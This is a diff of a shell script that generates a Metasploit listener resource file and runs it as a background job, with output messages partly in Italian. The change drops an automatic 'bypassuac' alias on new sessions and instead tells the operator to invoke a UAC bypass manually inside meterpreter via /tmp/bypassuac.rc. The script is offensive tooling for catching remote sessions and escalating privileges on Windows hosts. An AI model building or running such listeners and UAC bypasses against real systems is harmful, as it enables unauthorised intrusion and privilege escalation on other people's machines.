@@ -33,18 +33,9 @@ set LPORT $PORT
 set ExitOnSession false
 set EnableStageEncoding true
 
-# Create alias 'bypassuac' automatically on session creation
-set InitialAutoRunScript multi_console_command -rc /tmp/bypassuac_alias.rc
-
 exploit -j -z
 RC
 
-# Create alias script
-cat > /tmp/bypassuac_alias.rc << ALIAS_EOF
-alias bypassuac resource /tmp/bypassuac.rc
-ALIAS_EOF
-
-echo "$OUTFILE"
-echo "[+] Listener: $OUTFILE" >&2
-echo "[*] Run: msfconsole -r $OUTFILE" >&2
-echo "[*] Alias 'bypassuac' creato automaticamente su nuova sessione" >&2
+# Removed alias script generation - user will run bypassuac manually
+echo "[*] Run: msfconsole -r \$OUTFILE" >&2
+echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc)" >&2
